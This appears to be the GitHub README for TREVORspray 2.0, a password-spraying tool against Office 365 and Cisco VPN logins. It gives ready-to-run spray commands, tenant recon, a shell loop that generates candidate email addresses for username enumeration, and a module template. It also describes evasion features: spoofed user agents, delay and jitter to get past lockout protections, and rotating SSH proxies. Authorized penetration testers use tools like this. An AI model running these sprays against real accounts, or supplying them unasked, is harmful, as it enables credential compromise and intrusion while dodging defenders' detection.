# TREVORspray 2.0
TREVORspray is a modular password sprayer with threading, SSH proxying, loot modules, and more!

By [@thetechr0mancer](https://twitter.com/thetechr0mancer)

![trevorspray](https://user-images.githubusercontent.com/20261699/92338226-e366d680-f07c-11ea-8664-7b320783dc98.png)

## Features
- Supported modules:
  - `msol` (Office 365)
  - `anyconnect` (Cisco VPN)
  - See below for how to create your own
- Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.
- Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)
- Round-robin proxy through multiple IPs with `--ssh`
- Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
- Spoofs `User-Agent` and other signatures to look like legitimate auth traffic
- Logs everything to `~/.trevorspray/trevorspray.log`
- Saves valid usernames to `~/.trevorspray/valid_usernames.txt`
- Optional `--delay` and `--jitter` between request to bypass lockout countermeasures

## Installation:
```
$ git clone https://github.com/blacklanternsecurity/trevorspray
$ cd trevorspray
$ pip install -r requirements.txt
```

## How To - O365
- First, get a list of emails for `corp.com` and perform a spray to see if the default configuration works. Usually it does.
- If TREVORspray says the emails in your list don't exist, don't give up. Get the `token_endpoint` with `--recon corp.com`. The `token_endpoint` is the URL you'll be spraying against (with the `--url` option).
- It may take some experimentation before you find the right combination of `token_endpoint` + email format.
    - For example, if you're attacking `corp.com`, it may not be as easy as spraying `corp.com`. You may find that Corp's parent company Evilcorp owns their Azure tenant, meaning that you need to spray against `evilcorp.com`'s `token_endpoint`. Also, you may find that `corp.com`'s internal domain `corp.local` is used instead of `corp.com`.
    - So in the end, instead of spraying `bob@corp.com` against `corp.com`'s `token_endpoint`, you're spraying `bob@corp.local` against `evilcorp.com`'s.

## Example: Perform recon against a domain (retrieves tenant info, autodiscover, mx records, etc.)
```bash
trevorspray.py --recon evilcorp.com
...
    "token_endpoint": "https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token"
...
```

## Example: Spray against discovered "token_endpoint" URL
```bash
trevorspray.py -u emails.txt -p 'Fall2021!' --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
```

## Example: Spray with 5-second delay between requests
```bash
trevorspray.py -u bob@evilcorp.com -p 'Fall2021!' --delay 5
```

## Example: Spray and round-robin between 3 IPs (the current IP is also used, unless `-n` is specifiied)
```bash
trevorspray.py -u emails.txt -p 'Fall2021!' --ssh root@1.2.3.4 root@4.3.2.1
```

## Example: Find valid usernames without OSINT >:D
```bash
# clone wordsmith dataset
wget https://github.com/skahwah/wordsmith/releases/download/v2.1.1/data.tar.xz && tar -xvf data.tar.xz && cd data

# order first initial by occurrence
ordered_letters=asjmkdtclrebnghzpyivfowqux

# loop through first initials
echo -n $ordered_letters | while read -n1 f; do
  # loop through top 2000 USA last names
  head -n 2000 'usa/lnames.txt' | while read last; do
    # generate emails in f.last format
    echo "${f}.${last}@evilcorp.com"
  done
done | tee f.last.txt

trevorspray.py -e f.last.txt -p 'Fall2021!'
```

## TREVORspray - Help:
```
$ ./trevorspray.py --help
usage: trevorspray [-h] [-u USERS [USERS ...]] [-p PASSWORDS [PASSWORDS ...]] [-r DOMAIN [DOMAIN ...]] [-f] [-d DELAY] [-j JITTER] [--url URL] [-v] [-s USER@SERVER [USER@SERVER ...]]
                   [-i KEY] [-b BASE_PORT] [-n] [-nl] [-m {anyconnect,msol}] [-t TIMEOUT]

Execute password sprays against O365, optionally proxying the traffic through SSH hosts

optional arguments:
  -h, --help            show this help message and exit
  -u USERS [USERS ...], --users USERS [USERS ...]
                        Usernames(s) and/or file(s) containing usernames
  -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
                        Password(s) that will be used to perform the password spray
  -r DOMAIN [DOMAIN ...], --recon DOMAIN [DOMAIN ...]
                        Retrieves info related to authentication, email, Azure, Microsoft 365, etc.
  -f, --force           Forces the spray to continue and not stop when multiple account lockouts are detected
  -d DELAY, --delay DELAY
                        Sleep for this many seconds between requests
  -j JITTER, --jitter JITTER
                        Add a random delay of up to this many seconds between requests
  --url URL             The URL to spray against
  -v, --verbose, --debug
                        Show which proxy is being used for each request
  -s USER@SERVER [USER@SERVER ...], --ssh USER@SERVER [USER@SERVER ...]
                        Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used once per round
  -i KEY, -k KEY, --key KEY
                        Use this SSH key when connecting to proxy hosts
  -b BASE_PORT, --base-port BASE_PORT
                        Base listening port to use for SOCKS proxies
  -n, --no-current-ip   Don't spray from the current IP, only use SSH proxies
  -nl, --no-loot        Don't execute loot activites for valid accounts
  -t TIMEOUT, --timeout TIMEOUT
                        Connection timeout in seconds (default: 10)
  -m {anyconnect,msol}, --module {anyconnect,msol}
                        Spray module to use (default: msol)
```

## Writing Spray Modules
Writing your own spray modules is pretty straightforward. Create a new `.py` file in `lib/sprayers` (e.g. `lib/sprayers/example.py`), and fill out the HTTP method and any other parameters that you need in the requests. You can then use the module by specifying `-m example`. You can call the class whatever you want, but it needs to inherit from `BaseSprayModule`.
~~~python
# Example spray module

from .base import BaseSprayModule

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://login.evilcorp.com/'
    # body of request
    body = 'user={username}&pass={password}&group={otherthing}'
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Your Moms Smart Vibrator',
    }

    def initialize(self):
        '''
        Prep for 
        '''
        self.miscparams = {
            'otherthing': input("What's that other thing?")
        }
        return True

    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = ''

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)
~~~

CREDIT WHERE CREDIT IS DUE - MANY THANKS TO:
- [@dafthack](https://twitter.com/dafthack) for writing [MSOLSpray](https://github.com/dafthack/MSOLSpray)
- [@Mrtn9](https://twitter.com/Mrtn9) for his Python port of [MSOLSpray](https://github.com/MartinIngesen/MSOLSpray)
- [@KnappySqwurl](https://twitter.com/KnappySqwurl) for being a splunk wizard

![trevor](https://user-images.githubusercontent.com/20261699/92336575-27071380-f070-11ea-8dd4-5ba42c7d04b7.jpeg)

`#trevorforget`